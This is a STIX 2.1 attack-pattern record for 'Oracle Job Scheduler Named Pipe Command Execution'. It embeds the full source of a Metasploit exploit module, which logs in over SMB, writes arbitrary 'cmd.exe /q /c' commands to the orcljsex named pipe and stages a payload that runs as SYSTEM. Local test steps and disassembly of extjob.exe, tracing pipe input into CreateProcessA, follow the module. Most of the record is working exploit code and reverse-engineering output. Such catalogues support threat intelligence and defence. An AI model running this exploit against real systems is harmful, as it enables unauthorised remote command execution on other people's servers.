{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20ca3221-6dd3-4996-8604-bf6394e5701a",
    "created": "2024-08-14T16:50:22.787707Z",
    "modified": "2024-08-14T16:50:22.787711Z",
    "name": "Oracle Job Scheduler Named Pipe Command Execution",
    "description": " This module exploits the Oracle Job Scheduler to execute arbitrary commands. The Job Scheduler is implemented via the component extjob.exe which listens on a named pipe called \"orcljsex<SID>\" and execute arbitrary commands received over this channel via CreateProcess(). In order to connect to the Named Pipe remotely, SMB access is required. Note that the Job Scheduler is disabled in default installations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/oracle/extjob.rb",
            "external_id": "extjob.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.amazon.com/Oracle-Hackers-Handbook-Hacking-Defending/dp/0470080221"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Job Scheduler Named Pipe Command Execution',\n      'Description'    => %q{\n          This module exploits the Oracle Job Scheduler to execute arbitrary commands. The Job\n        Scheduler is implemented via the component extjob.exe which listens on a named pipe\n        called \"orcljsex<SID>\" and execute arbitrary commands received over this channel via\n        CreateProcess(). In order to connect to the Named Pipe remotely, SMB access is required.\n        Note that the Job Scheduler is disabled in default installations.\n      },\n      'Author'         =>\n        [\n          'David Litchfield', # Vulnerability discovery and exploit\n          'juan vazquez',     # Metasploit module\n          'sinn3r'            # Metasploit fu\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.amazon.com/Oracle-Hackers-Handbook-Hacking-Defending/dp/0470080221' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n        },\n      'Platform'       => 'win',\n      # This module has been tested on Oracle 10g Release 1\n      # where the Oracle Job Scheduler runs as SYSTEM on Windows\n      'Targets'        => [['Automatic',{}]],\n      'CmdStagerFlavor' => 'vbs',\n      'Privileged'     => true,\n      'DisclosureDate' => '2007-01-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('SID', [ true, 'The database sid', 'ORCL'])\n      ])\n\n  end\n\n  def exploit\n    if check == Exploit::CheckCode::Vulnerable\n      print_status(\"Exploiting through \\\\\\\\#{datastore['RHOST']}\\\\orcljsex#{datastore['SID']} named pipe...\")\n      execute_cmdstager({:linemax => 1500})\n      handler\n    else\n      print_error \"Host does not appear to be vulnerable!\"\n    end\n  end\n\n  def execute_command(cmd, opts)\n    connect()\n    smb_login()\n    pipe = simple.create_pipe(\"\\\\orcljsex#{datastore['SID']}\")\n    pipe.write(\"cmd.exe /q /c #{cmd}\")\n    pipe.close\n    disconnect\n  end\n\n  def check\n\n    begin\n      connect()\n      smb_login()\n      pipe = simple.create_pipe(\"\\\\orcljsex#{datastore['SID']}\")\n      pipe.write(\"cmd.exe /q /c dir\")\n      result = pipe.read() # Exit Code\n      pipe.close\n      disconnect\n    rescue\n      return Exploit::CheckCode::Safe\n    end\n\n    if result == \"1\" # Exit Code should be 1\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\nend\n\n=begin\nHow To Test locally:\n1. Go to Administrative Tools -> Services -> Set 'OracleJobSchedulerORCL' to automatic, and\n   then Start the service.\n2. Make sure you know your SMBUser and SMBPass\n3. Run:\n   C:\\Documents and Settings\\juan\\PipeList>echo cmd.exe /c calc.exe > \\\\.\\pipe\\orcljsexorcl\n\nCode Analysis of extjob.exe (Oracle 10g Release 1)\n=================================================\n\nFrom _ServiceStart():\n\n* Create Named Pipe and store handle on \"esi\":\n\n.text:004017EC                 push    offset _pipename\n.text:004017F1                 lea     ecx, [ebp+Name]\n.text:004017F7                 push    offset $SG59611 ; \"\\\\\\\\.\\\\pipe\\\\orcljsex%s\"\n.text:004017FC                 push    ecx\n.text:004017FD                 jmp     short loc_401810\n.text:004017FF ; ---------------------------------------------------------------------------\n.text:004017FF\n.text:004017FF loc_4017FF:                             ; CODE XREF: _ServiceStart+FA\u0018j\n.text:004017FF                 push    offset $SG59613\n.text:00401804                 lea     edx, [ebp+Name]\n.text:0040180A                 push    offset $SG59614 ; \"\\\\\\\\.\\\\pipe\\\\orcljsex%s\"\n.text:0040180F                 push    edx             ; Dest\n.text:00401810\n.text:00401810 loc_401810:                             ; CODE XREF: _ServiceStart+10D\u0018j\n.text:00401810                 call    ds:__imp__sprintf\n.text:00401816                 add     esp, 0Ch\n.text:00401819                 push    edi\n.text:0040181A                 push    edi\n.text:0040181B                 push    4\n.text:0040181D                 call    _ReportStatusToSCMgr\n.text:00401822                 add     esp, 0Ch\n.text:00401825                 test    eax, eax\n.text:00401827                 jz      loc_4018EC\n.text:0040182D                 mov     edi, ds:__imp__CreateNamedPipeA@32 ; CreateNamedPipeA(x,x,x,x,x,x,x,x)\n.text:0040185C                 mov     esi, eax\n\n* Connect Named Pipe\n\n.text:0040188F                 push    eax             ; lpOverlapped\n.text:00401890                 push    esi             ; hNamedPipe\n.text:00401891                 call    ds:__imp__ConnectNamedPipe@8 ; ConnectNamedPipe(x,x)\n\n* Create Thread with ExecMain() as lpStartAddress and esi (The Pipe handle) as parameter\n\n.text:004018B9                 lea     edx, [ebp+ThreadId]\n.text:004018BC                 push    edx             ; lpThreadId\n.text:004018BD                 push    0               ; dwCreationFlags\n.text:004018BF                 push    esi             ; lpParameter\n.text:004018C0                 push    offset _ExecMain ; lpStartAddress\n.text:004018C5                 push    0               ; dwStackSize\n.text:004018C7                 push    0               ; lpThreadAttributes\n.text:004018C9                 call    ds:__imp__CreateThread@24 ; CreateThread(x,x,x,x,x,x)\n\nFrom ExecMain():\n\n* Stores Named Pipe Handle in ebx\n\n.text:0040197C                 mov     ebx, [ebp+hObject]\n\n* Read From Named Pipe\n\n.text:004019C4                 lea     eax, [ebp+NumberOfBytesRead]\n.text:004019C7                 push    edx             ; lpOverlapped\n.text:004019C8                 push    eax             ; lpNumberOfBytesRead\n.text:004019C9                 lea     ecx, [ebp+Buffer]\n.text:004019CF                 push    10000h          ; nNumberOfBytesToRead\n.text:004019D4                 push    ecx             ; lpBuffer\n.text:004019D5                 push    ebx             ; hFile\n.text:004019D6                 call    ds:__imp__ReadFile@20 ; ReadFile(x,x,x,x,x)\n\n* CreateProcess with lpCommandLine full controlled by the user input\n\n.text:00401A06                 mov     ecx, 11h\n.text:00401A0B                 xor     eax, eax\n.text:00401A0D                 lea     edi, [ebp+StartupInfo]\n.text:00401A10                 push    esi\n.text:00401A11                 rep stosd\n.text:00401A13                 lea     eax, [ebp+ProcessInformation]\n.text:00401A16                 lea     ecx, [ebp+StartupInfo]\n.text:00401A19                 push    eax             ; lpProcessInformation\n.text:00401A1A                 push    ecx             ; lpStartupInfo\n.text:00401A1B                 push    0               ; lpCurrentDirectory\n.text:00401A1D                 push    0               ; lpEnvironment\n.text:00401A1F                 push    0               ; dwCreationFlags\n.text:00401A21                 push    0               ; bInheritHandles\n.text:00401A23                 push    0               ; lpThreadAttributes\n.text:00401A25                 lea     edx, [ebp+Buffer]\n.text:00401A2B                 push    0               ; lpProcessAttributes\n.text:00401A2D                 push    edx             ; lpCommandLine\n.text:00401A2E                 push    0               ; lpApplicationName\n.text:00401A30                 mov     [ebp+StartupInfo.cb], 44h\n.text:00401A37                 mov     [ebp+StartupInfo.wShowWindow], 5\n.text:00401A3D                 mov     [ebp+StartupInfo.dwFlags], 100h\n.text:00401A44                 mov     [ebp+StartupInfo.lpDesktop], offset $SG59671\n.text:00401A4B                 call    ds:__imp__CreateProcessA@40 ; CreateProcessA(x,x,x,x,x,x,x,x,x,x)\n\n\n=end\n",
    "x_mitre_disclosure_date": "2007-01-01",
    "x_mitre_platforms": [
        "win'"
    ]
}